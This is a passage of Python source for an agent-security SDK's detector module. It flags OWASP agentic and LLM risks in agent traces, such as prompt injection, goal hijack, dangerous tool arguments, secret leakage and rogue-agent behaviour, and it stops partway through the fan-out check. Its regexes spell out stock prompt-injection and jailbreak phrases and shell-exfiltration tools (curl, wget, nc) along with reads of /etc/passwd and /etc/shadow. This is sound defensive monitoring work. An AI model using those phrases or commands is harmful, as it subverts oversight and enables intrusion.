"""Detectors.

AIR detectors cover two public OWASP taxonomies plus one AIR-native signal.

1. **OWASP Top 10 for Agentic Applications** (``ASI01``..``ASI10``):
   - ``ASI01`` Agent Goal Hijack: implemented as ``detect_goal_hijack``.
   - ``ASI02`` Tool Misuse & Exploitation: implemented as ``detect_tool_misuse``.
   - ``ASI03`` Identity & Privilege Abuse: implemented as
     ``detect_identity_privilege_abuse``. Zero-Trust-for-agents enforcement:
     takes an operator-declared ``AgentRegistry`` and flags identity
     forgery (signer-key mismatch for a claimed agent), unknown-agent
     activity, out-of-scope tool invocations, and privilege-tier
     escalation. Emits no findings when no registry is supplied
     (declared-scope only, not a learned baseline).
   - ``ASI04`` Agentic Supply Chain Vulnerabilities: **partial coverage**
     via ``detect_mcp_supply_chain_risk``. Flags MCP server invocations
     against a naming-convention heuristic. Full ASI04 coverage
     (runtime dependency poisoning, tool-manifest tampering, ecosystem
     drift) is on the roadmap.
   - ``ASI05`` Unexpected Code Execution (RCE): implemented as
     ``detect_unexpected_code_execution``. Matches tool_name against
     execution-semantics patterns (eval, shell, deserialize, package
     install) and emits severity tied to blast radius. Complements ASI02
     (dangerous args) by flagging the *surface* rather than the args.
   - ``ASI09`` Human-Agent Trust Exploitation: implemented as
     ``detect_human_agent_trust_exploitation``. Flags LLM responses that
     combine manipulation-pattern language (fabricated authority, fake
     consensus, urgency, reassurance, false trusted-source citation)
     with an imminent sensitive tool call. Covers the
     fabricated-rationale class of ASI09 scenarios.
   - ``ASI06`` Memory & Context Poisoning: implemented as
     ``detect_memory_context_poisoning``. Two heuristic checks:
     retrieval-class tool outputs containing injection-shaped content
     (seeded memory), and memory-write-class tool arguments containing
     injection-shaped content (poisoned persistence).
   - ``ASI07`` Insecure Inter-Agent Communication: implemented as
     ``detect_insecure_inter_agent_communication``. Walks ``AGENT_MESSAGE``
     records for missing identity, missing nonce, sender/key mismatch,
     replay, and protocol downgrade.
   - ``ASI08`` Cascading Failures: implemented as
     ``detect_cascading_failures``. Two structural checks over
     ``AGENT_MESSAGE`` records: oscillating feedback loops between a
     pair (``A -> B -> A -> B`` beyond threshold) and fan-out bursts
     (one source sending to many distinct targets in a short window).
     Covers OWASP ASI08 examples #1 (planner-executor coupling),
     #3 (inter-agent cascade), and #7 (feedback-loop amplification).
   - ``ASI10`` Rogue Agents: implemented as ``detect_rogue_agent``.
     Zero-Trust-for-agents enforcement: takes an operator-declared
     ``AgentRegistry`` with per-agent ``BehavioralScope`` blocks and flags
     deviations from the declared envelope (unexpected tools, fan-out
     beyond the declared ceiling, off-hours activity, session tool-count
     budget exceeded). This is explicitly declared-scope enforcement,
     not learned-baseline anomaly detection. Emits no findings when no
     registry or no behavioral_scope is declared. The learned-baseline
     variant (statistical behavioural profiling, peer comparison) is a
     roadmap item for a future release.

2. **OWASP Top 10 for LLM Applications** (``LLM01``..``LLM10``), covered
   by the AIR-native detectors since they are per-LLM-call signals,
   not per-agent-plan signals:
   - ``AIR-01`` Prompt Injection -> maps to ``LLM01 Prompt Injection``.
   - ``AIR-02`` Sensitive Data Exposure -> maps to
     ``LLM06 Sensitive Information Disclosure``.
   - ``AIR-03`` Unrestricted Resource Consumption -> maps to
     ``LLM04 Model Denial of Service``.

3. **AIR-native detectors** with no direct OWASP equivalent:
   - ``AIR-04`` Untraceable Action: chain-integrity check. Implemented
     as ``detect_untraceable_action``.
"""
from __future__ import annotations

import re
from collections import defaultdict
from datetime import UTC, datetime

from airsdk.registry import AgentDescriptor, AgentRegistry
from airsdk.types import AgDRRecord, Finding, StepKind

STOPWORDS = frozenset({
    "a", "an", "and", "are", "as", "at", "be", "by", "do", "for", "from", "have",
    "he", "i", "in", "is", "it", "of", "on", "or", "please", "she", "that", "the",
    "their", "them", "they", "this", "to", "was", "were", "will", "with", "you",
    "your", "can", "could", "should", "would", "help", "me", "my", "us", "we",
})

SENSITIVE_TOOL_MARKERS = (
    "delete", "drop", "truncate", "exec", "shell", "sudo", "admin",
    "transfer", "wire", "refund", "migrate", "grant", "revoke",
    "send_email", "send_sms", "post_to", "publish",
)

GOAL_HIJACK_THRESHOLD = 0.15

# ASI02 Tool Misuse & Exploitation dangerous-argument patterns.
DANGEROUS_ARG_PATTERNS: tuple[tuple[str, re.Pattern[str]], ...] = (
    ("shell metacharacters", re.compile(r"(?:\||;|&&|\$\(|`).*(?:rm|curl|wget|nc\s|bash|sh\s)", re.IGNORECASE)),
    ("path traversal", re.compile(r"\.\./|\.\.\\|/etc/passwd|/etc/shadow|%2e%2e", re.IGNORECASE)),
    ("unbounded SQL DELETE", re.compile(r"delete\s+from\s+\w+(?:\s*;|\s*$)", re.IGNORECASE)),
    ("unbounded SQL UPDATE", re.compile(r"update\s+\w+\s+set\s+[^;]*?(?:;|$)(?!.*where)", re.IGNORECASE | re.DOTALL)),
    ("SSRF-shaped URL", re.compile(r"https?://(?:127\.|0\.0\.0\.0|localhost|169\.254\.|10\.|192\.168\.|172\.(?:1[6-9]|2[0-9]|3[01])\.)", re.IGNORECASE)),
    ("credential leak", re.compile(r"(?:aws_secret|api[_-]?key|password|bearer\s+[a-z0-9]{20,})", re.IGNORECASE)),
)

# AIR-01 Prompt Injection patterns. Heuristic, not exhaustive.
# Aim: catch the patterns every pentester tries in the first 60 seconds.
INJECTION_PATTERNS: tuple[tuple[str, re.Pattern[str]], ...] = (
    ("ignore-previous-instructions", re.compile(r"\b(?:ignore|disregard|forget)\s+(?:all\s+|the\s+)?(?:previous|prior|above|earlier|preceding)\s+(?:instructions?|rules?|prompts?|messages?|directives?)\b", re.IGNORECASE)),
    ("role-reset", re.compile(r"\b(?:you\s+are\s+now|from\s+now\s+on\s+you\s+are|act\s+as|pretend\s+(?:to\s+be|you\s+are)|new\s+role|switch\s+roles?)\b", re.IGNORECASE)),
    ("fake system marker", re.compile(r"(?:^|\n)\s*\[?(?:system|assistant|user)\s*\]?\s*[:>]\s", re.IGNORECASE | re.MULTILINE)),
    ("jailbreak prefix (DAN/developer mode)", re.compile(r"\b(?:DAN|do anything now|developer\s+mode|jailbreak|unfiltered|no restrictions?)\b", re.IGNORECASE)),
    ("rule override", re.compile(r"\b(?:override|bypass|skip)\s+(?:safety|guard\w*|filter|policy|rules?|restrictions?)\b", re.IGNORECASE)),
    ("base64 instruction payload", re.compile(r"\b(?:decode\s+(?:this|the following)|base64[:\s]+)\s*[A-Za-z0-9+/]{32,}={0,2}\b", re.IGNORECASE)),
    ("unicode bidi override", re.compile(r"[\u202a-\u202e\u2066-\u2069]")),
    ("inline credential exfil request", re.compile(r"\b(?:reveal|print|output|show|list)\s+(?:your|the)\s+(?:system\s+prompt|instructions?|api[_\s-]?key|secret|token)\b", re.IGNORECASE)),
)

# AIR-02 Sensitive Data Exposure patterns.
# Order matters: higher-confidence first, so we surface the most actionable match.
SENSITIVE_DATA_PATTERNS: tuple[tuple[str, str, re.Pattern[str]], ...] = (
    # (label, severity, pattern)
    ("PEM private key", "critical", re.compile(r"-----BEGIN (?:RSA|EC|OPENSSH|PGP|DSA|ENCRYPTED)?\s?PRIVATE KEY-----")),
    ("AWS access key", "critical", re.compile(r"\bAKIA[0-9A-Z]{16}\b")),
    ("GitHub PAT (fine-grained)", "critical", re.compile(r"\bgithub_pat_[0-9a-zA-Z_]{70,}\b")),
    ("GitHub token", "critical", re.compile(r"\bgh[pousr]_[0-9A-Za-z]{30,}\b")),
    ("OpenAI API key", "critical", re.compile(r"\bsk-(?:proj-)?[A-Za-z0-9_\-]{32,}\b")),
    ("Anthropic API key", "critical", re.compile(r"\bsk-ant-[A-Za-z0-9_\-]{32,}\b")),
    ("Slack token", "critical", re.compile(r"\bxox[abprsu]-[A-Za-z0-9-]{10,}\b")),
    ("JWT", "high", re.compile(r"\beyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\b")),
    ("PyPI token", "critical", re.compile(r"\bpypi-AgE[A-Za-z0-9_\-]{20,}\b")),
    ("SSN (US)", "high", re.compile(r"\b(?!000|666|9\d\d)\d{3}-(?!00)\d{2}-(?!0000)\d{4}\b")),
    ("credit card (16 digits)", "high", re.compile(r"\b(?:\d{4}[ -]?){3}\d{4}\b")),
)

# ASI04 Agentic Supply Chain Vulnerabilities: MCP tool-name patterns.
MCP_TOOL_PATTERN = re.compile(r"(?:^mcp[_\-\.]|[_\-]mcp[_\-]|^mcp\.)", re.IGNORECASE)

# AIR-03 Unrestricted Resource Consumption thresholds.
BURST_WINDOW_SECONDS = 60
BURST_THRESHOLD = 20           # >20 tool_start events inside a 60s window
SESSION_TOTAL_THRESHOLD = 50   # >50 tool calls total in a session
TOOL_REPEAT_THRESHOLD = 10     # same tool_name invoked >=10 times

# AIR-04 Untraceable Action thresholds.
TIME_GAP_THRESHOLD_SECONDS = 300  # >5 min silence between consecutive records

UNIMPLEMENTED_DETECTORS: tuple[tuple[str, str], ...] = ()

# Coverage descriptors. Third field is an honest status / mapping note.
# (code, name, status_note)
IMPLEMENTED_ASI_DETECTORS: tuple[tuple[str, str, str], ...] = (
    ("ASI01", "Agent Goal Hijack", "implemented"),
    ("ASI02", "Tool Misuse & Exploitation", "implemented"),
    ("ASI03", "Identity & Privilege Abuse", "implemented (Zero-Trust-for-agents: requires operator-declared AgentRegistry)"),
    ("ASI04", "Agentic Supply Chain Vulnerabilities", "partial: MCP supply-chain risk only"),
    ("ASI05", "Unexpected Code Execution (RCE)", "implemented (execution-semantics tool-name patterns)"),
    ("ASI06", "Memory & Context Poisoning", "implemented (heuristic: retrieval-output + memory-write scans)"),
    ("ASI07", "Insecure Inter-Agent Communication", "implemented"),
    ("ASI08", "Cascading Failures", "implemented (feedback-loop + fan-out checks over inter-agent messages)"),
    ("ASI09", "Human-Agent Trust Exploitation", "implemented (fabricated-rationale + manipulation-language scan preceding sensitive actions)"),
    ("ASI10", "Rogue Agents", "implemented (Zero-Trust behavioral-scope enforcement: requires declared BehavioralScope in AgentRegistry)"),
)


# ASI08 Cascading Failures thresholds. Tuned for pathological signals, not
# normal back-and-forth. Normal planner/executor patterns use 2-3 round
# trips and 3-4 fan-out targets; defaults sit above that band.
OSCILLATION_PAIR_THRESHOLD = 4          # >=4 complete A->B->A->B cycles = 8 messages
FAN_OUT_TARGET_THRESHOLD = 5            # 1 source -> >=5 distinct targets
FAN_OUT_WINDOW_RECORDS = 10             # distinct targets observed within 10 consecutive records


# ASI09 Human-Agent Trust Exploitation: manipulation-pattern regexes.
# Matched against LLM response text that precedes a sensitive tool_start.
# Grouped by manipulation subtype; severity "high" for all because the
# finding only fires when paired with an actual sensitive-action context.
MANIPULATION_PATTERNS: tuple[tuple[str, re.Pattern[str]], ...] = (
    ("fabricated authority", re.compile(
        r"\b(?:i(?:'|\u2019)?ve|i\s+have)\s+(?:already\s+)?(?:verified|confirmed|validated|approved|cleared|checked|authenticated)\b",
        re.IGNORECASE,
    )),
    ("fake consensus", re.compile(
        r"\b(?:as\s+(?:we|you)\s+(?:discussed|agreed|requested)|per\s+(?:your|our)\s+(?:earlier|previous)|as\s+requested\s+earlier|per\s+our\s+prior\s+conversation)\b",
        re.IGNORECASE,
    )),
    ("reassurance override", re.compile(
        r"\b(?:this\s+is\s+(?:safe|routine|standard|pre[-\s]?approved|authorized)|no\s+(?:further|additional)\s+(?:checks?|reviews?|approvals?)\s+(?:needed|required)|auto[-\s]?approved|routine\s+action)\b",
        re.IGNORECASE,
    )),
    ("urgency pressure", re.compile(
        r"\b(?:urgent(?:ly)?|immediately|asap|before\s+(?:the\s+)?(?:cutoff|deadline|eod|close\s+of\s+business)|time[-\s]?sensitive|critical\s+deadline|right\s+now|without\s+delay)\b",
        re.IGNORECASE,
    )),
    ("false trusted-source citation", re.compile(
        r"\b(?:trusted\s+source\s+(?:confirms?|says|indicates|reports)|per\s+(?:the\s+)?(?:trusted|verified|approved)\s+(?:source|channel)|according\s+to\s+(?:a\s+)?verified\s+source)\b",
        re.IGNORECASE,
    )),
)


# ASI05 Unexpected Code Execution (RCE): tool-name patterns grouped by severity.
# Intentionally narrow, word-boundaried so "evaluate_metrics" does not fire
# "eval". ASI02 already covers dangerous-argument patterns; ASI05 complements
# it by flagging the *surface* (tools whose semantics are code execution).
EXECUTION_TOOL_PATTERNS: tuple[tuple[str, str, re.Pattern[str]], ...] = (
    ("python/code eval", "critical", re.compile(
        r"\b(?:python_?eval|exec_?python|python_?exec|run_python|execute_code|code_interpreter|eval_code|run_code)\b",
        re.IGNORECASE,
    )),
    ("javascript eval", "critical", re.compile(
        r"\b(?:js_?eval|javascript_?eval|node_?eval|run_javascript|execute_js)\b",
        re.IGNORECASE,
    )),
    ("unsafe deserialization", "critical", re.compile(
        r"\b(?:unpickle|pickle_?load|yaml_?load_unsafe|yaml_?unsafe_?load|marshal_?load|unserialize|load_pickle)\b",
        re.IGNORECASE,
    )),
    ("shell execution", "high", re.compile(
        r"\b(?:shell_?exec|run_shell|bash_?exec|exec_?shell|subprocess_run|system_?exec|spawn_shell|run_command|execute_shell)\b",
        re.IGNORECASE,
    )),
    ("package install", "high", re.compile(
        r"\b(?:pip_?install|npm_?install|yarn_?add|cargo_?install|gem_?install|apt_?install|brew_?install|package_install)\b",
        re.IGNORECASE,
    )),
)


# ASI06 Memory & Context Poisoning: tool-name markers.
# Matched as substrings against a lower-cased tool_name. Keep focused enough
# to avoid false positives on unrelated tools (e.g. plain "search" is too broad).
RETRIEVAL_TOOL_MARKERS = (
    "memory",
    "recall",
    "retrieve",
    "rag",
    "vector",
    "knowledge_base",
    "kb_read",
    "kb_lookup",
    "kb_query",
    "embeddings_query",
    "context_load",
    "lookup_memory",
    "fetch_memory",
    "semantic_search",
)

MEMORY_WRITE_TOOL_MARKERS = (
    "memory_write",
    "remember",
    "save_context",
    "vector_add",
    "vector_upsert",
    "rag_upsert",
    "rag_add",
    "kb_write",
    "store_memory",
    "persist_memory",
    "memorize",
    "embed_and_store",
)

# AIR-side detectors: the first three map to OWASP LLM Top 10 categories;
# AIR-04 is a genuinely novel forensic-chain-integrity check.
# (code, name, mapping_note)
IMPLEMENTED_AIR_DETECTORS: tuple[tuple[str, str, str], ...] = (
    ("AIR-01", "Prompt Injection", "OWASP LLM01 Prompt Injection"),
    ("AIR-02", "Sensitive Data Exposure", "OWASP LLM06 Sensitive Information Disclosure"),
    ("AIR-03", "Unrestricted Resource Consumption", "OWASP LLM04 Model Denial of Service"),
    ("AIR-04", "Untraceable Action", "AIR-native (no direct OWASP equivalent)"),
)


def _tokens(text: str) -> set[str]:
    words = re.findall(r"[a-zA-Z][a-zA-Z0-9_]{1,}", text.lower())
    return {w for w in words if w not in STOPWORDS}


def _extract_user_intent(records: list[AgDRRecord]) -> str:
    """Reconstruct the user's stated goal by concatenating the initial prompts.

    Prefers an explicit ``user_intent`` field when present; otherwise falls back
    to the first few ``llm_start`` prompts.
    """
    explicit = [
        r.payload.user_intent for r in records if r.payload.user_intent
    ]
    if explicit:
        return " ".join(explicit)
    prompts = [
        r.payload.prompt for r in records
        if r.kind == StepKind.LLM_START and r.payload.prompt
    ]
    return " ".join(prompts[:3])


def _tool_context_text(record: AgDRRecord) -> str:
    parts: list[str] = []
    if record.payload.tool_name:
        parts.append(record.payload.tool_name)
    if record.payload.tool_args:
        for value in record.payload.tool_args.values():
            parts.append(str(value))
    return " ".join(parts)


def detect_goal_hijack(records: list[AgDRRecord]) -> list[Finding]:
    """ASI01 Agent Goal Hijack: user asked for one thing, agent invokes tools unrelated to it."""
    intent_tokens = _tokens(_extract_user_intent(records))
    if not intent_tokens:
        return []

    findings: list[Finding] = []
    for index, record in enumerate(records):
        if record.kind != StepKind.TOOL_START:
            continue
        tool_text = _tool_context_text(record)
        tool_tokens = _tokens(tool_text)
        if not tool_tokens:
            continue

        overlap = len(intent_tokens & tool_tokens) / max(len(intent_tokens | tool_tokens), 1)
        tool_name_lower = (record.payload.tool_name or "").lower()
        looks_sensitive = any(marker in tool_name_lower for marker in SENSITIVE_TOOL_MARKERS)

        if overlap < GOAL_HIJACK_THRESHOLD and looks_sensitive:
            findings.append(
                Finding(
                    detector_id="ASI01",
                    title="Agent Goal Hijack",
                    severity="high",
                    step_id=record.step_id,
                    step_index=index,
                    description=(
                        f"Tool `{record.payload.tool_name}` called with "
                        f"token overlap {overlap:.2f} against the user's stated intent. "
                        f"Threshold {GOAL_HIJACK_THRESHOLD}. Tool is in the sensitive-actions list."
                    ),
                )
            )
    return findings


def detect_tool_misuse(records: list[AgDRRecord]) -> list[Finding]:
    """ASI02 Tool Misuse & Exploitation: tool invoked with dangerous argument patterns."""
    findings: list[Finding] = []
    for index, record in enumerate(records):
        if record.kind != StepKind.TOOL_START or not record.payload.tool_args:
            continue
        arg_blob = " ".join(str(v) for v in record.payload.tool_args.values())
        for label, pattern in DANGEROUS_ARG_PATTERNS:
            if pattern.search(arg_blob):
                findings.append(
                    Finding(
                        detector_id="ASI02",
                        title="Tool Misuse & Exploitation",
                        severity="critical",
                        step_id=record.step_id,
                        step_index=index,
                        description=(
                            f"Tool `{record.payload.tool_name}` invoked with arguments "
                            f"matching pattern: {label}."
                        ),
                    )
                )
                break
    return findings


def detect_prompt_injection(records: list[AgDRRecord]) -> list[Finding]:
    """AIR-01 Prompt Injection: llm_start payload carries known prompt-injection shapes.

    Heuristic only. Keyword-based matching against the prompts the agent
    consumed. This surfaces obvious injection attempts (ignore-previous,
    role-reset, fake system markers, jailbreak prefixes, base64 payloads,
    bidi obfuscation, credential-exfil requests). It will miss novel or
    multi-turn social-engineering attacks; for that, use a dedicated
    classifier in the prevention layer.
    """
    findings: list[Finding] = []
    for index, record in enumerate(records):
        if record.kind != StepKind.LLM_START or not record.payload.prompt:
            continue
        prompt = record.payload.prompt
        for label, pattern in INJECTION_PATTERNS:
            match = pattern.search(prompt)
            if match:
                findings.append(
                    Finding(
                        detector_id="AIR-01",
                        title="Prompt Injection",
                        severity="high",
                        step_id=record.step_id,
                        step_index=index,
                        description=(
                            f"Prompt at step {index} matches the `{label}` pattern "
                            f"(matched: {match.group(0)[:80]!r})."
                        ),
                    )
                )
                break
    return findings


def _record_text_fields(record: AgDRRecord) -> list[tuple[str, str]]:
    """Return ``(label, text)`` pairs for every user-visible string field on a record."""
    out: list[tuple[str, str]] = []
    p = record.payload
    if p.prompt:
        out.append(("prompt", p.prompt))
    if p.response:
        out.append(("response", p.response))
    if p.tool_output:
        out.append(("tool_output", p.tool_output))
    if p.final_output:
        out.append(("final_output", p.final_output))
    if p.tool_args:
        for k, v in p.tool_args.items():
            out.append((f"tool_args[{k}]", str(v)))
    return out


def detect_sensitive_data_exposure(records: list[AgDRRecord]) -> list[Finding]:
    """AIR-02 Sensitive Data Exposure: secrets, credentials, or PII in prompts/outputs/args.

    Scans every string field on every record against a curated pattern list
    (PEM keys, provider API keys, GitHub/PyPI tokens, JWT, US SSN, 16-digit
    card numbers). One finding per matching record-field-pattern combination.
    """
    findings: list[Finding] = []
    for index, record in enumerate(records):
        for field_label, text in _record_text_fields(record):
            for pattern_label, severity, pattern in SENSITIVE_DATA_PATTERNS:
                if pattern.search(text):
                    findings.append(
                        Finding(
                            detector_id="AIR-02",
                            title="Sensitive Data Exposure",
                            severity=severity,
                            step_id=record.step_id,
                            step_index=index,
                            description=(
                                f"Sensitive pattern `{pattern_label}` detected in "
                                f"{record.kind.value}.{field_label}. Review for unintended "
                                f"credential or PII leakage."
                            ),
                        )
                    )
                    break  # one finding per field, highest-priority match
    return findings


def detect_mcp_supply_chain_risk(records: list[AgDRRecord]) -> list[Finding]:
    """ASI04 Agentic Supply Chain Vulnerabilities: tool invocation via an MCP server.

    Heuristic: tool_name matching MCP naming conventions (``mcp_*``, ``mcp.*``,
    or ``*_mcp_*``) is surfaced for supply-chain review. The finding does not
    assert the server is malicious; it flags the invocation so auditors can
    cross-reference it against their MCP inventory and verify the server's
    identity, version, and permission scope. MCP is currently the largest
    agentic supply-chain surface, which is why this detector sits under ASI04.
    """
    findings: list[Finding] = []
    for index, record in enumerate(records):
        if record.kind != StepKind.TOOL_START or not record.payload.tool_name:
            continue
        name = record.payload.tool_name
        if MCP_TOOL_PATTERN.search(name):
            findings.append(
                Finding(
                    detector_id="ASI04",
                    title="Agentic Supply Chain Vulnerabilities",
                    severity="medium",
                    step_id=record.step_id,
                    step_index=index,
                    description=(
                        f"Tool `{name}` matches an MCP server invocation naming "
                        f"pattern. Cross-reference against your MCP inventory and "
                        f"verify server identity, version, and scope."
                    ),
                )
            )
    return findings


def _parse_timestamp(ts: str) -> float | None:
    """Best-effort ISO8601 -> unix seconds. Returns ``None`` on malformed input."""
    from datetime import datetime
    try:
        normalized = ts.replace("Z", "+00:00") if ts.endswith("Z") else ts
        return datetime.fromisoformat(normalized).timestamp()
    except (ValueError, TypeError):
        return None


def detect_resource_consumption(records: list[AgDRRecord]) -> list[Finding]:
    """AIR-03 Unrestricted Resource Consumption: tool-call frequency, total, or repetition.

    Three sub-heuristics:
      1. Burst: more than ``BURST_THRESHOLD`` tool_start events within any
         rolling ``BURST_WINDOW_SECONDS``-wide window.
      2. Session total: more than ``SESSION_TOTAL_THRESHOLD`` tool calls
         across the entire trace.
      3. Single-tool loop: the same ``tool_name`` invoked at least
         ``TOOL_REPEAT_THRESHOLD`` times.

    Each triggered check emits one finding. Heuristic only; the thresholds
    are configurable constants at the top of this module.
    """
    findings: list[Finding] = []
    tool_starts = [(i, r) for i, r in enumerate(records) if r.kind == StepKind.TOOL_START]

    # (2) Session total
    if len(tool_starts) > SESSION_TOTAL_THRESHOLD:
        last_idx, last_rec = tool_starts[-1]
        findings.append(
            Finding(
                detector_id="AIR-03",
                title="Unrestricted Resource Consumption",
                severity="high",
                step_id=last_rec.step_id,
                step_index=last_idx,
                description=(
                    f"Session total of {len(tool_starts)} tool calls exceeds "
                    f"threshold of {SESSION_TOTAL_THRESHOLD}. Review for runaway "
                    f"agent behavior."
                ),
            )
        )

    # (3) Single-tool repetition
    name_counts: dict[str, tuple[int, int, str]] = {}  # tool_name -> (count, last_index, last_step_id)
    for index, record in tool_starts:
        name = record.payload.tool_name or "<unknown>"
        count, _, _ = name_counts.get(name, (0, index, record.step_id))
        name_counts[name] = (count + 1, index, record.step_id)
    for name, (count, last_index, last_step_id) in name_counts.items():
        if count >= TOOL_REPEAT_THRESHOLD:
            findings.append(
                Finding(
                    detector_id="AIR-03",
                    title="Unrestricted Resource Consumption",
                    severity="medium",
                    step_id=last_step_id,
                    step_index=last_index,
                    description=(
                        f"Tool `{name}` invoked {count} times in a single session "
                        f"(threshold {TOOL_REPEAT_THRESHOLD}). Possible loop or runaway retry."
                    ),
                )
            )

    # (1) Burst: rolling window over tool_start timestamps.
    timestamps: list[tuple[int, AgDRRecord, float]] = []
    for i, r in tool_starts:
        t = _parse_timestamp(r.timestamp)
        if t is not None:
            timestamps.append((i, r, t))
    for left in range(len(timestamps)):
        window_end = timestamps[left][2] + BURST_WINDOW_SECONDS
        right = left
        while right < len(timestamps) and timestamps[right][2] <= window_end:
            right += 1
        count = right - left
        if count > BURST_THRESHOLD:
            last_index, last_rec, _ = timestamps[right - 1]
            findings.append(
                Finding(
                    detector_id="AIR-03",
                    title="Unrestricted Resource Consumption",
                    severity="high",
                    step_id=last_rec.step_id,
                    step_index=last_index,
                    description=(
                        f"{count} tool calls inside a {BURST_WINDOW_SECONDS}s window "
                        f"(threshold {BURST_THRESHOLD}). Possible denial-of-service "
                        f"or runaway plan."
                    ),
                )
            )
            break  # one burst finding per trace; don't over-flag overlapping windows
    return findings


def detect_untraceable_action(records: list[AgDRRecord]) -> list[Finding]:
    """AIR-04 Untraceable Action: the chain has structural gaps that obscure what the agent did.

    Three sub-heuristics:
      1. ``tool_start`` with no matching ``tool_end`` before the next
         higher-level step (the tool executed but the result was not
         recorded).
      2. ``llm_start`` with no matching ``llm_end`` before the next
         higher-level step (the LLM call's response was not recorded,
         which is exactly the shape a crashed or suppressed call leaves).
      3. Time gap between consecutive records exceeds
         ``TIME_GAP_THRESHOLD_SECONDS`` (session went silent, evidence of
         the interval is missing).
    """
    findings: list[Finding] = []

    # (1) + (2): find unpaired starts. A start is paired if the next record
    # of a "closing" kind matches it before any higher-level boundary.
    for index, record in enumerate(records):
        if record.kind == StepKind.TOOL_START:
            # Next record must be tool_end; if it's anything else, flag.
            if index + 1 >= len(records) or records[index + 1].kind != StepKind.TOOL_END:
                findings.append(
                    Finding(
                        detector_id="AIR-04",
                        title="Untraceable Action",
                        severity="high",
                        step_id=record.step_id,
                        step_index=index,
                        description=(
                            f"tool_start for `{record.payload.tool_name}` at step "
                            f"{index} is not followed by a matching tool_end. "
                            f"Tool outcome is not in the forensic chain."
                        ),
                    )
                )
        elif record.kind == StepKind.LLM_START and (
            index + 1 >= len(records) or records[index + 1].kind != StepKind.LLM_END
        ):
            findings.append(
                Finding(
                    detector_id="AIR-04",
                    title="Untraceable Action",
                    severity="high",
                    step_id=record.step_id,
                    step_index=index,
                    description=(
                        f"llm_start at step {index} is not followed by a "
                        f"matching llm_end. LLM response is not in the "
                        f"forensic chain."
                    ),
                )
            )

    # (3): time gaps between consecutive records
    for index in range(1, len(records)):
        t_prev = _parse_timestamp(records[index - 1].timestamp)
        t_cur = _parse_timestamp(records[index].timestamp)
        if t_prev is not None and t_cur is not None and (t_cur - t_prev) > TIME_GAP_THRESHOLD_SECONDS:
            gap = int(t_cur - t_prev)
            findings.append(
                Finding(
                    detector_id="AIR-04",
                    title="Untraceable Action",
                    severity="medium",
                    step_id=records[index].step_id,
                    step_index=index,
                    description=(
                        f"Silent interval of {gap}s between step {index - 1} and "
                        f"step {index} (threshold {TIME_GAP_THRESHOLD_SECONDS}s). "
                        f"Agent activity during this window is not in the chain."
                    ),
                )
            )

    return findings


def detect_cascading_failures(records: list[AgDRRecord]) -> list[Finding]:
    """ASI08 Cascading Failures.

    OWASP Top 10 for Agentic Applications v12.6, ASI08. ASI08 is about
    *propagation* of a fault across agents, not the origin of the fault.
    OWASP calls out four observable symptoms: rapid fan-out,
    oscillating retries or feedback loops between agents, repeated
    identical intents, and cross-domain spread. Two of those are
    tractable from a single signed chain of ``AGENT_MESSAGE`` records:

      1. Oscillating feedback loop between a pair. When the same ordered
         pair ``(A, B)`` produces ``A -> B -> A -> B ...`` beyond
         ``OSCILLATION_PAIR_THRESHOLD`` complete cycles, that is the
         feedback-loop amplification pattern (OWASP ASI08 example #7).
         Severity ``high``.
      2. Fan-out burst. When a single source agent sends messages to
         ``FAN_OUT_TARGET_THRESHOLD`` or more distinct target agents
         within a ``FAN_OUT_WINDOW_RECORDS`` window, that is the
         planner/coordinator cascade pattern (OWASP ASI08 examples #1
         and #3). Severity ``critical`` because compromise of a hub
         multiplies blast radius.

    Cross-domain spread (symptom #4) and repeated identical intents
    (symptom #3) require either multi-session correlation or fuzzy
    near-duplicate matching; both are deliberately out of scope for
    single-trace, regex-free detection.
    """
    findings: list[Finding] = []

    # Collect inter-agent messages in order.
    messages: list[tuple[int, str, str, AgDRRecord]] = []  # (index, src, dst, record)
    for index, record in enumerate(records):
        if record.kind != StepKind.AGENT_MESSAGE:
            continue
        src = record.payload.source_agent_id
        dst = record.payload.target_agent_id
        if src and dst:
            messages.append((index, src, dst, record))

    if not messages:
        return findings

    # Check 1: oscillating feedback loop between an unordered pair.
    # Count alternations in the sequence of messages restricted to each pair.
    pair_sequences: dict[frozenset[str], list[tuple[int, str, str, AgDRRecord]]] = {}
    for entry in messages:
        _, src, dst, _ = entry
        pair_key = frozenset({src, dst})
        pair_sequences.setdefault(pair_key, []).append(entry)

    flagged_pair_keys: set[frozenset[str]] = set()
    for pair_key, seq in pair_sequences.items():
        if len(pair_key) != 2 or len(seq) < OSCILLATION_PAIR_THRESHOLD * 2:
            continue
        # Count direction flips. A cycle is one round trip (A->B paired with B->A).
        # With N alternating messages, flips = N - 1 and cycles = ceil(N / 2).
        flips = 0
        last_dir: tuple[str, str] | None = None
        for _, src, dst, _ in seq:
            direction = (src, dst)
            if last_dir is not None and direction != last_dir:
                flips += 1
            last_dir = direction
        cycles = (flips + 1) // 2
        if cycles >= OSCILLATION_PAIR_THRESHOLD:
            last_index, _last_src, _last_dst, last_record = seq[-1]
            a, b = sorted(pair_key)
            findings.append(
                Finding(
                    detector_id="ASI08",
                    title="Cascading Failures",
                    severity="high",
                    step_id=last_record.step_id,
                    step_index=last_index,
                    description=(
                        f"Pair `{a}` <-> `{b}` exchanged {len(seq)} messages in an "
                        f"oscillating pattern ({cycles} full cycles, threshold "
                        f"{OSCILLATION_PAIR_THRESHOLD}). Feedback-loop amplification; "
                        f"compounds any initial fault across the pair "
                        f"(OWASP ASI08 example #7)."
                    ),
                )
            )
            flagged_pair_keys.add(pair_key)

    # Check 2: fan-out burst. Sliding window over the message list keyed by source.
    window_start = 0
    flagged_fanout_sources: set[str] = set()
    for window_end in range(len(messages)):
        # Shrink window to fit records-distance (window uses raw record index).
        while (
            window_start < window_end
            and messages[window_end][0] - messages[window_start][0] > FAN_OUT_WINDOW_RECORDS
        ):
            window_start += 1
        source_to_targets: dict[str, set[str]] = {}
        for i in range(window_start, window_end + 1):
            _, s, d, _ = messages[i]
            source_to_targets.setdefault(s, set()).add(d)
        for source, targets in source_to_targets.items():
            if source in flagged_fanout_sources:
                continue
            if len(targets) >= FAN_OUT_TARGET_THRESHOLD:
                last_index, _, _, last_record = messages[window_end]
                findings.append(
                    Finding(
                        detector_id="ASI08",
                        title="Cascading Failures",
                        severity="critical",
                        step_id=last_record.step_id,
                        step_index=last_index,
                        description=(
                            f"Agent `{source}` sent messages to {len(targets)} distinct "
                            f"agents within {FAN_OUT_WINDOW_RECORDS} records "
